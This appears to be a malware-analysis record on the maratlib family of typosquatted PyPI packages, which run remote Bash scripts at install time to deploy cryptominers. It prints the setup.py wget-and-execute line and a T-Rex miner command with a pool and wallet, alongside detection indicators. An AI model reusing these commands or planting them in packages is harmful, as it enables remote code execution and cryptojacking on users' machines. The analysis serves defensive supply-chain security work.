package_info.package_name: maratlib (and related: maratlib1, matplatlib-plus, mllearnlib, mplatlib, learninglib)
package_info.package_versions: maratlib (0.6, 1.0), all versions of related packages
package_info.why_malicious: These packages are typosquats and dependency confusion attacks that, when installed, execute malicious code during installation. The code downloads and executes remote Bash scripts that install and run cryptomining malware, hijacking the victim's system resources for unauthorized cryptocurrency mining.

malicious_snippets.code_snippet: print(__import__("subprocess").getoutput("cd /tmp && wget https://github.com/nedog123/files/raw/main/aza.sh -O gay.sh && chmod 777 gay.sh && bash gay.sh"))
malicious_snippets.code_behavior: During installation, the code downloads a remote Bash script from GitHub, saves it as 'gay.sh', makes it executable, and runs it, resulting in the execution of arbitrary remote code.

malice_analysis.why_suspicious: Executing remote code during installation is a classic malware technique, especially when the code is fetched from an external, attacker-controlled source.
malice_analysis.violated_expectations: setup.py should only define package metadata and build/install logic, not execute arbitrary remote scripts.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies or binaries, but never arbitrary scripts from untrusted sources.
key_indicators: Uses subprocess to run shell commands
Script source is an attacker-controlled GitHub repo

malicious_snippets.code_snippet: Heavily obfuscated Python code that, when deobfuscated, attempts to connect to GitHub and download/execute remote scripts (exact code not shown, but behavior confirmed by dynamic analysis).
malicious_snippets.code_behavior: During installation, the obfuscated code connects to GitHub and downloads/executes a remote Bash script, enabling arbitrary code execution.

malice_analysis.why_suspicious: Obfuscation is used to hide malicious intent and evade detection. The behavior matches that of v0.6, but is intentionally concealed.
malice_analysis.violated_expectations: Legitimate packages do not obfuscate installation logic or fetch/execute remote scripts.
malice_analysis.similar_legitimate_use: Obfuscation is rarely justified in open source install scripts.

malicious_snippets.code_snippet:
wget https://github.com/trexminer/T-Rex/releases/download/0.19.14/t-rex-0.19.14-linux-cuda9.2.tar.gz && tar xzf t-rex-0.19.14-linux-cuda9.2.tar.gz
./t-rex -a ethash -o stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3333 -u 3J4ygk5ymMcTgkTDMtEYSPwdrDMuLyandx -p x
malicious_snippets.code_behavior: When executed, the script downloads a cryptominer binary (T-Rex), extracts it, and launches it to mine cryptocurrency using the attacker's wallet address.

malice_analysis.why_suspicious: Downloading and running cryptomining software without user consent is a clear sign of malicious activity.
malice_analysis.violated_expectations: No legitimate package should install and run cryptominers as part of its installation process.
malice_analysis.similar_legitimate_use: Legitimate mining software may do this, but only with explicit user consent and documentation.
key_indicators: Hardcoded mining pool and wallet address

malicious_snippets.code_behavior: When executed, the script downloads and runs the Ubqminer cryptominer, connecting to a mining pool with the attacker's wallet address.

malice_analysis.why_suspicious: This is a textbook example of cryptojacking, hijacking system resources for unauthorized mining.
malice_analysis.violated_expectations: No legitimate package should install and run cryptominers as part of its installation process.
malice_analysis.similar_legitimate_use: Only legitimate mining software, with user consent.

malicious_snippets.code_behavior: During installation, the package automatically pulls in the malicious 'maratlib' dependency, triggering its postinstall malicious payload.

malice_analysis.why_suspicious: Typosquatting and dependency confusion are used to trick users into installing malicious code.
malice_analysis.violated_expectations: install_requires should only reference legitimate, necessary dependencies.
malice_analysis.similar_legitimate_use: Legitimate packages use install_requires for real dependencies, not to propagate malware.

attack_chain.action: User installs a typosquatted or dependency confusion package (e.g., learninglib, mplatlib, etc.)
maratlib setup.py executes postinstall code, downloading and running a remote Bash script from GitHub
The Bash script downloads and runs a cryptominer (T-Rex or Ubqminer) with attacker's wallet and mining pool
attack_chain.leads_to: Victim's machine is hijacked for unauthorized cryptomining

behavioral_signatures: setup.py executing subprocess or os.system with network calls
Downloading and executing remote scripts during installation
file_indicators: setup.py containing subprocess or os.system calls
References to external scripts (aza.sh, aza2.sh, seo.sh, etc.)
install_requires referencing maratlib or similar typosquats
network_indicators: Connections to mining pools (e.g., daggerhashimoto.eu-west.nicehash.com, ubq.kryptex.network)
detection_knowledge.how_to_detect: Monitor for setup.py scripts that invoke subprocess or os.system to download and execute remote scripts, especially from untrusted sources. Flag packages with obfuscated install scripts or those that reference known malicious dependencies (e.g., maratlib). Detect network connections to known mining pools or GitHub URLs serving malicious scripts during package installation. Alert on any package that downloads and runs cryptominer binaries without explicit user consent.
